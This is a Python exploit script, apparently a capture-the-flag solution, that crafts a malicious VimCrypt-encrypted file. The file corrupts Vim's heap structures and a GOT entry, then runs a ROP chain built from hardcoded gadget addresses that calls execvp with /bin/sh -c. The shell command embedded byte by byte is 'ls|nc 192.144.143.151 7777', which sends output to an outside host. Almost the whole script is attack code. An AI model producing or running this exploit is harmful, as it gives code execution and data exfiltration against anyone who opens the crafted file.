#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys
import ctypes

def prime(p):

    tmp = ctypes.c_int(2).value
    while tmp*tmp<=p:
        if p%tmp==0:
            return False
        tmp+=1

    return True

def modminus(n,m):

    res = n % m
    if res>0:
        res -= m
    return res

def get_iv(p):
    return (0x80000000 - (0x7ffffffe%p)) ^ 0x61

start_len = int(sys.argv[1],0)

size = ctypes.c_int(start_len - 4).value
origin_size = size
while not prime(size):

    size+=1

print hex(size)
#iv_v = get_iv(size)
iv_v = int(sys.argv[2], 0)
iv = ctypes.c_int(iv_v).value

print 'stepeq', iv%size

#print modminus(-5,3)
step_init = ctypes.c_int(iv ^ 0x61).value

if step_init % size == 0:

    step_init += 1 #sign kept

i = 4
cur_idx = ctypes.c_int(0).value
dic = {}
visit = []

while i < start_len:

    if cur_idx < origin_size:
        #print "[*] %d %d" %((cur_idx+4), i)
        dic[i] = cur_idx + 4 # target index , i is offset in input
        visit.append((i, cur_idx+4, cur_idx))
        i+=1
    temp = ctypes.c_int(cur_idx + step_init).value
    if temp > 0:
        div_val = temp % size 
    else:
        div_val = modminus(temp, size)
    cur_idx = ctypes.c_int(div_val).value

#print dic

dici = {j:i for i,j in dic.items()}

print "------------"
for i in range(-0x18,-0x10)+range(0,0x20):
    print hex(i), dici.get(i,None)

'''
dici = {j:i for i,j in dic.items()}
for i in range(0x30):

    try:
        print str(-1*i) + " " + str(dici[-1*i])
    except:
        pass

'''
positive = []

for tup in visit:

    idx = tup[0]
    offset = tup[1]
    if offset >=0:
        
        positive.append(tup)

checker = []
for tup in visit:

    idx = tup[0]
    offset = tup[1]
    if -48 <= tup[1] < 0:

        checker.append(tup)

print checker

for tup in visit:

    idx = tup[0]
    offset = tup[1]
    if -0x18-4 <= tup[1] < -0x18:

        print tup

print "=============="


file_header = "VimCrypt~04!"
IV = p32(iv_v)[::-1]

padding = ""
padding = padding.ljust((start_len-0x4), "\x61")

hyb = IV + padding 

hyb = list(hyb)

# recover struct

poiarr = p64(0x0000000000000411)[::-1] + p64(0x0000000000000000)[::-1] + p64(0x000000000092b7f0)[::-1] + p64(size)[::-1] + (p32(step_init)+p32(start_len-4))[::-1] + p64(0x0000006100000061)[::-1]

print len(checker)

Got_free = 0x8a8238

for obj in checker:

    # in range of struct 
    seq = obj[0]
    position = obj[1]
    # if position non critical, write it to recover.


    if -40 <= position < -28 or -21 < position < 0:

        # none cur_idx and none buffer.
        temp_p = -1*position - 1  
        temp_c = poiarr[temp_p] # should be written to.
        hyb[seq] = temp_c
    
    #shoot 
    if position == -21:

        hyb[seq] = chr(0)
    
    if position == -22:

        hyb[seq] = chr(0x8a)

    if position == -23:

        hyb[seq] = chr(0x82)

    if position == -24:

        hyb[seq] = chr(0x30)

    if position == -25:

        hyb[seq] = chr(0xff)

    if position == -26:

        hyb[seq] = chr(0xff)

    if position == -27:

        hyb[seq] = chr(0xff)

    if position == -28:

        temper = (0x100 - (-1 * position + 4)) & 0xff
        
        hyb[seq] = chr(temper)
        
    #check shift to write just 0x1000 for now. 
    if position == -41:

        hyb[seq] = chr(0)

    if position == -42:

        hyb[seq] = chr(0)

    if position == -43:

        hyb[seq] = chr(0x10)

    if position == -44:

        hyb[seq] = chr(0)

#update

# rop me!

pop_rdi = 0x00000000005b771d
pop_rsi = 0x00000000004c4457
pop_rdx = 0x00000000005cd1ca
binsh   = 0x000000000065C6E4
mc      = 0x000000000065C6DE
position= 0 #secondary ptr
shell   = 0
execvp  = 0x403490
pivot_0x28 = 0x4081a6
pivot_0x18 = 0x0000000000420e3d 
nop = 0x00000000005f6c54
doublearr = 0x00000000008a82e8
pivot50 = 0x0000000000555853
pivotlong = 0x0000000000551bd4#0x0000000000551bd4 : add esp, 0x108 ; pop rbx ; pop rbp ; ret
p300 = 0x000000000064ce8f

gadget0_dic = {4: "\x1d", 5:"\x77", 6:"\x5b", 7:"\0", 8:"\0", 9:"\0",10:"\0",11:"\0"} # init pop rdi
gadget1_dic = {12: "\xf8",13:"\x71", 14: "\x46", 15:"\0", 16:"\0", 17:"\0",18:"\0",19:"\0"} #
gadget2_dic = {20:"\xa6", 21:"\x81", 22: "\x40", 23:"\0", 24:"\0", 25:"\0",26:"\0",27:"\0"} #trans


gadget3_dic = {68:"\x1d", 69:"\x77", 70: "\x5b", 71:"\0", 72:"\0", 73:"\0",74:"\0",75:"\0"} #poprdi 
gadget4_dic = {76:"\xe4", 77:"\xc6", 78: "\x65", 79:"\0", 80:"\0", 81:"\0",82:"\0",83:"\0"} #binsh 
gadget5_dic = {84:"\x54", 85:"\x6c", 86: "\x5f", 87:"\0", 88:"\0", 89:"\0",90:"\0",91:"\0"} #nop
gadget6_dic = {92:"\x3d", 93:"\x0e", 94: "\x42", 95:"\0", 96:"\0", 97:"\0",98:"\0",99:"\0"} #pivot

t2 = 4 + 0x78+8
gadget7_dic = {4+0x78:"\x57", 4+0x79:"\x44", 4+0x7a:"\x4c", 4+0x7b:"\0", 4+0x7c:"\0", 4+0x7d:"\0", 4+0x7e:"\0", 4+0x7f:"\0"} #pop rsi
t3 = t2 + 8

gadget8_dic = {t2:"\xa8", t2+1:"\x88", t2+2:"\x8a", t2+3:"\0", t2+4:"\0", t2+5:"\0", t2+6:"\0", t2+7:"\0"} #arr.
gadget9_dic = {t3:"\x8f", t3+1:"\xce", t3+2:"\x64", t3+3:"\0", t3+4:"\0", t3+5:"\0", t3+6:"\0", t3+7:"\0"} #pivot120.

t4 = 4 + 0x408
gadgeta_dic = {t4:"\x90", t4+1:"\x34", t4+2:"\x40", t4+3:"\0", t4+4:"\0", t4+5:"\0", t4+6:"\0", t4+7:"\0"} #Go!.

t5 = 4 + 0x678
gadgetb_dic = {t5:"\xe4", t5+1:"\xc6", t5+2:"\x65", t5+3:"\0", t5+4:"\0", t5+5:"\0", t5+6:"\0", t5+7:"\0"} #binsh 
t6 = t5+8
gadgetc_dic = {t6:"\xde", t6+1:"\xc6", t6+2:"\x65", t6+3:"\0", t6+4:"\0", t6+5:"\0", t6+6:"\0", t6+7:"\0"} #-c
t7 = t6+8
gadgetd_dic = {t7:"\x78", t7+1:"\x88", t7+2:"\x8a", t7+3:"\0", t7+4:"\0", t7+5:"\0", t7+6:"\0", t7+7:"\0"} #str addr 
t8 = t7+8
gadgete_dic = {t8:"\x00", t8+1:"\x00", t8+2:"\x00", t8+3:"\0", t8+4:"\0", t8+5:"\0", t8+6:"\0", t8+7:"\0"} #NULL
t9 = 4 + 0x648
ta = t9+8
tb = ta+8
tc = tb+8
gadgetf_dic= {t9:"l", t9+1:"s", t9+2: "\0", t9+3:"\0", t9+4:"c", t9+5:" ",t9+6:"1",t9+7:"9"}# ls|nc 192.144.143.151 7777
gadgetg_dic= {ta:"2", ta+1:".", ta+2: "1", ta+3:"4", ta+4:"4", ta+5:".",ta+6:"1",ta+7:"4"}# ls|nc 192.144.143.151 7777
gadgeti_dic= {tb:"3", tb+1:".", tb+2: "1", tb+3:"5", tb+4:"1", tb+5:" ",tb+6:"1",tb+7:"\0"}# ls|nc 192.144.143.151 1
gadgetm_dic= {tc:"\0",tc+1:"\0",tc+2: "\0",tc+3:"\0",tc+4:"\0",tc+5:"\0",tc+6:"\0",tc+7:"\0"}# ls|nc 192.144.143.151 1





#gadget4_dic = {36:"\x57", 37:"\x44", 38: "\x4e", 39:"\0", 40:"\0", 41:"\0",42:"\0",43:"\0"} #poprsi
#gadget5_dic = {44:"\x60", 45:"\x82", 46: "\x8a", 47:"\0", 48:"\0", 49:"\0",50:"\0",51:"\0"} #ptraddr!!
#gadget6_dic = {52:"\xe4", 53:"\xc6", 54: "\x65", 55:"\0", 56:"\0", 57:"\0",58:"\0",59:"\0"} # it's an array. bin/sh
#gadget7_dic = {60:"\xde", 61:"\xc6", 62: "\x65", 63:"\0", 64:"\0", 65:"\0",66:"\0",67:"\0"} #-c
#gadget8_dic = {68:"\x80", 69:"\x82", 70: "\x8a", 71:"\0", 72:"\0", 73:"\0",74:"\0",75:"\0"} #str 
#gadget9_dic = {76:"\x00", 77:"\x00", 78: "\x00", 79:"\0", 80:"\0", 81:"\0",82:"\0",83:"\0"} #NULL

D = dict(gadget0_dic.items()+gadget1_dic.items() + gadget2_dic.items()+gadget3_dic.items()+gadget4_dic.items())
D = dict(D.items()+gadget5_dic.items()+gadget6_dic.items()+gadget7_dic.items())
D = dict(D.items()+gadget8_dic.items()+gadget9_dic.items()+gadgeta_dic.items())
D = dict(D.items()+gadgetb_dic.items()+gadgetc_dic.items()+gadgetd_dic.items()+gadgete_dic.items())
D = dict(D.items()+gadgetf_dic.items()+gadgetg_dic.items()+gadgeti_dic.items()+gadgetm_dic.items())

#all place.
for p in positive:

    seq = p[0]
    poi = p[1]

    if poi in D: #pop rdi 

        hyb[seq] = D[poi]




'''
def getme(poilist):

    rest = [] # seq to write.
    for objector in visit:
        seq = objector[0]
        poisit = objector[1]
        if poisit in poilist:
            rest.append((seq, poisit))
    return rest 

temp = getme(poil)
print temp
for item in getme(poil):

    print item[0]
    print gadget1_dic[item[1]]
    hyb[item[0]] = gadget1_dic[item[1]]
'''

hyb = ''.join(hyb)

file_content = file_header + hyb




fp = open("./tryme","wb")
fp.write(file_content)
os.system("rm .tryme*")
fp.close()
